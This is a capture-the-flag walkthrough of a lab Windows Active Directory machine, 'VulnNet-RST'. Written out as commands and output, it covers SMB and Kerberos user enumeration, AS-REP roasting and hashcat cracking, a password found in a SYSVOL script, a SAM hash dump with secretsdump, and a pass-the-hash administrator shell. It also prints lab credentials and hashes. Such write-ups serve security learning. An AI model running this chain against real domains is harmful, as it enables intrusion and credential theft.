# Enumeration

I first started by doing basic enumeration on the machine.

## Ports scanning

From the nmap perspective, the machine seemed to be down. So I had to use the `-Pn` parameter to run the scan.

```bash
nmap -sC -sV -p- -v -Pn 10.10.253.215 -oN ports.txt
```

```
{REDACTED}
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-13 09:32:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
{REDACTED}
```



## Samba enumeration

`enum4linux` didn't help much but `smbmap` returned something interesting:

```bash
smbmap -H 10.10.253.215-u anonymous -p ""
```

```
[+] Guest session       IP: 10.10.253.215445    Name: 10.10.253.215                                                                                                                                         
        Disk                                                    Permissions     Comment                                                                                                                     
        ----                                                    -----------     -------                                                                                                                     
        ADMIN$                                                  NO ACCESS       Remote Admin                                                                                                                
        C$                                                      NO ACCESS       Default share                                                                                                               
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```

The `IPC$` share is readable. This share contains information such as local users, meaning it is possible to enumerate them.

### Anonymous shares

Before doing so, I tried to access the found Anonymous shares to see if there any valuable information:

```bash
smbclient -N \\\\10.10.253.215\\VulnNet-Business-Anonymous
```

```
smb: \> ls
  .                                   D        0  Sat Mar 13 04:46:40 2021
  ..                                  D        0  Sat Mar 13 04:46:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 03:24:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 03:24:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 03:24:34 2021

8540159 blocks of size 4096. 4319889 blocks available
```

I retrieved these files using `get` command.

```
smb: \> get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \> get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0,3 KiloBytes/sec) (average 0,2 KiloBytes/sec)
```

I got 4 names from the files (they may be users of the machine): 

```
Alexa Whitehat
Jack Goldenhand
Tony Skid
Johnny Leet
```

## Users enumeration

I had two ways of performing this enumeration. First, I could generate a wordlist based on the previous names and use this wordlist to uncover valid usernames. Second, since IPC$ share is readable, I could simply try to brute-force sids (this method is more reliable). I dit both and compared the results. 

First method, I used a tool from [this project](https://github.com/captain-noob/username-wordlist-generator/tree/master). It asks you to put the names in a file called `user.txt` then you can run the tool with python and it generates the created usernames at `output.txt`. Once done, I ran `kerbrute` to uncover the valid ones. However, the domain name was needed and I didn't what it was. It was possible to find it using the [ldap](#ldap) protocol.

```bash
./kerbrute_linux_amd64 userenum -d vulnnet-rst.local /output.txt --dc 10.10.253.215
```

```
2025/03/14 19:35:54 >  Using KDC(s):
2025/03/14 19:35:54 >   10.10.253.215:88

2025/03/14 19:35:55 >  [+] VALID USERNAME:       J-Goldenhand@vulnnet-rst.local
2025/03/14 19:35:55 >  [+] VALID USERNAME:       A-Whitehat@vulnnet-rst.local
2025/03/14 19:35:55 >  [+] VALID USERNAME:       J-Leet@vulnnet-rst.local
2025/03/14 19:35:56 >  [+] T-Skid has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$T-Skid@VULNNET-RST.LOCAL:335d6a943e15ce1ffe88543e04017fdf$8b810df018c68dc998d251d81187e00ca10e3883be1f1aa56c998f25fc8ab04315018049ef1f7c7ede21c814405213650cff20b6f8a316e752ce416a45b4d53c3d842213af650ab0cdafe728c92f1bd6db3aa6a587403e1aaba6d2d249b9cf5f4a3a51ab73d29abf31bb5604962d68b8a9820c8d431db9a67eea22f25288febb214b23b6546969ad79012550b205d268d6728427351f5feb0a9ea3a7bc1862d4cb93b061a048b720860ddccf388a3e7aae4ac4eb60115018580369f904d35cfabb63c22932441bf10a85444da33facd2672fbaa102ba36e05547b52653fc55fa9aaff86f49b09fed450354d9cc5c661a52b3c87b86d0e29b51edb138a67c3c09d93d6e42047f05ebc7c2
2025/03/14 19:35:56 >  [+] VALID USERNAME:       T-Skid@vulnnet-rst.local
2025/03/14 19:35:56 >  Done! Tested 56 usernames (4 valid) in 1.253 seconds
```

I even got a ticket hash ! 

Second methods:

```bash
lookupsid.py guest@10.10.253.215 -no-pass
```

```
[*] Brute forcing SIDs at 10.10.253.215
[*] StringBinding ncacn_np:10.10.253.215[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

I asked ChatGPT to extract the usernames.

```
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

Then to dump hashes related to the users:

`GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.253.215 'vulnnet-rst/'`

```
Impacket v0.13.0.dev0+20250121.134700.ff8d248c - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:396d72f96c5723818ead36e2717bf734$39b6cd8d198beb96b5026bab6fab9f50ffa602cf3820d23669f67958aeb7641d5f42ec4d1f1004d05bb07135208d599a0d2d66357c0c6c626a19e2b6b84309fbe716b33b3c76478f579bbf26f76ed2b20ad3a8a22a7e67a29ef46cd1e30fd3149d9b8b1190f245782843902d445efe0df9dee07c4b2fee48b50ba5f7b4854b76d7ffb017a928ea3d8e99f14d560151341a9fc68d6e4183bd593242cf7ff8af0b78f90d4e00215b558c77ed91b3a5a82454874f3534b595c30a4a2f6681982aff3c4f07f149b53b1c1b7ead68940052ca19a1825de95a49910c1201063ecb4918ed14e540949d86af02eda0ebe54bc7f9
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

And there you go.

## Ldap

`nmap -Pn --script=ldap* -p 389 10.10.253.215`

```
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=vulnnet-rst,DC=local                                                                                      
|       serverName: CN=WIN-2BO8M1OE1M1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vulnnet-rst,DC=local                                                  
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=vulnnet-rst,DC=local         
|       namingContexts: DC=vulnnet-rst,DC=local                                         
|       namingContexts: CN=Configuration,DC=vulnnet-rst,DC=local                        
|       namingContexts: CN=Schema,CN=Configuration,DC=vulnnet-rst,DC=local              
|       namingContexts: DC=DomainDnsZones,DC=vulnnet-rst,DC=local                       
|       namingContexts: DC=ForestDnsZones,DC=vulnnet-rst,DC=local                       
|       isSynchronized: TRUE                
|       highestCommittedUSN: 61470          
|       dsServiceName: CN=NTDS Settings,CN=WIN-2BO8M1OE1M1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vulnnet-rst,DC=local                              
|       dnsHostName: WIN-2BO8M1OE1M1.vulnnet-rst.local                                  
|       defaultNamingContext: DC=vulnnet-rst,DC=local                                   
|       currentTime: 20250313111924.0Z      
|_      configurationNamingContext: CN=Configuration,DC=vulnnet-rst,DC=local            
```

`DC=vulnnet-rst,DC=local` confirms that vulnnet-rst.local is the domain name

# Foothold

## Ticket hash cracking

`hashcat -a 0 -m 18200 ASREProastables.txt rockyou.txt`

```
$krb5asrep$23$t-skid@VULNNET-RST:396d72f96c5723818ead36e2717bf734$39b6cd8d198beb96b5026bab6fab9f50ffa602cf3820d23669f67958aeb7641d5f42ec4d1f1004d05bb07135208d599a0d2d66357c0c6c626a19e2b6b84309fbe716b33b3c76478f579bbf26f76ed2b20ad3a8a22a7e67a29ef46cd1e30fd3149d9b8b1190f245782843902d445efe0df9dee07c4b2fee48b50ba5f7b4854b76d7ffb017a928ea3d8e99f14d560151341a9fc68d6e4183bd593242cf7ff8af0b78f90d4e00215b558c77ed91b3a5a82454874f3534b595c30a4a2f6681982aff3c4f07f149b53b1c1b7ead68940052ca19a1825de95a49910c1201063ecb4918ed14e540949d86af02eda0ebe54bc7f9:tj072889*
```

With these credentials I again used `smbmap` to see which shares I could access :

`smbmap -u t-skid -p tj072889* -H 10.10.253.215`

```

[+] IP: 10.10.253.215:445       Name: 10.10.253.215               
                                                                                                                                          
Disk                                                    Permissions     Comment                                                                                                                     
----                                                    -----------     -------                                                                                                                     
ADMIN$                                                  NO ACCESS       Remote Admin                                                                                                                
C$                                                      NO ACCESS       Default share                                                                                                               
IPC$                                                    READ ONLY       Remote IPC                                                                                                                  
NETLOGON                                                READ ONLY       Logon server share                                                                                                          
SYSVOL                                                  READ ONLY       Logon server share                                                                                                          
VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing                                                                                                    
VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing  
```

I noticed I had read access to the `sysvol` share which contains `Group Policy templates` and `scripts`. I listed the content of this directory and came across a script called `ResetPassword.vbs` which I downloaded into my machine.

`smbclient -U "t-skid" \\\\10.10.253.215\\SYSVOL`

```
smb: \> dir
  .                                   D        0  Thu Mar 11 21:19:49 2021
  ..                                  D        0  Thu Mar 11 21:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 21:19:49 2021
```

```
smb: \vulnnet-rst.local\> dir                                                                                                                                                                               
  .                                   D        0  Thu Mar 11 21:23:40 2021                                                                                                                                  
  ..                                  D        0  Thu Mar 11 21:23:40 2021                                                                                                                                  
  DfsrPrivate                      DHSr        0  Thu Mar 11 21:23:40 2021                                                                                                                                  
  Policies                            D        0  Thu Mar 11 21:20:26 2021                                                                                                                                  
  scripts                             D        0  Wed Mar 17 01:15:49 2021                                                                                                                                  
```

```
smb: \vulnnet-rst.local\> dir scripts\
  .                                   D        0  Wed Mar 17 01:15:49 2021
  ..                                  D        0  Wed Mar 17 01:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 01:18:14 2021
```

Inside the script were credentials for another user.

```vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
{REDACTED}
```

# Privilege escalation

With this new user, it was possible to do way more as we could access the root directory of the machine.

`smbmap -u a-whitehat -p bNdKVkjv3RR9ht -H 10.10.253.215`

```
[+] IP: 10.10.253.215445        Name: 10.10.253.215                                     
[/] Work[!] Unable to remove test directory at \\10.10.253.215SYSVOL\TNIJFSAYDG, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        SYSVOL                                                  READ, WRITE     Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

I got a shell with this command:

`impacket-wmiexec vulnnet-rsf.local/a-whitehat@10.10.253.215`

```
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Well, the ways to achieve privilege escalation are unlimited. A quick way to get the system flag would be to use the `SeTakeOwnershipPrivilege` and then use the `takeown` command like so:

```
C:\Users\Administrator>takeown /f Desktop\system.txt

SUCCESS: The file (or folder): "C:\Users\Administrator\Desktop\system.txt" now owned by user "VULNNET-RST\a-whitehat".

C:\Users\Administrator>icacls Desktop\system.txt /grant Name:F
Name: No mapping between account names and security IDs was done.
Successfully processed 0 files; Failed processing 1 files

C:\Users\Administrator>icacls Desktop\system.txt /grant a-whitehat:F
processed file: Desktop\system.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>type Desktop\system.txt
THM{16f45eHIDDEN}
```

Another method would be to get the administrator hash by dumping the `SAM` registry. One simple way to do it would be to use `secretsdump`.

`secretsdump.py a-whitehat@10.10.253.215`

```
Impacket v0.13.0.dev0+20250121.134700.ff8d248c - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Then 

`impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d vulnnet-rsf.local/administrator@10.10.253.215`

```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vulnnet-rst\administrator
```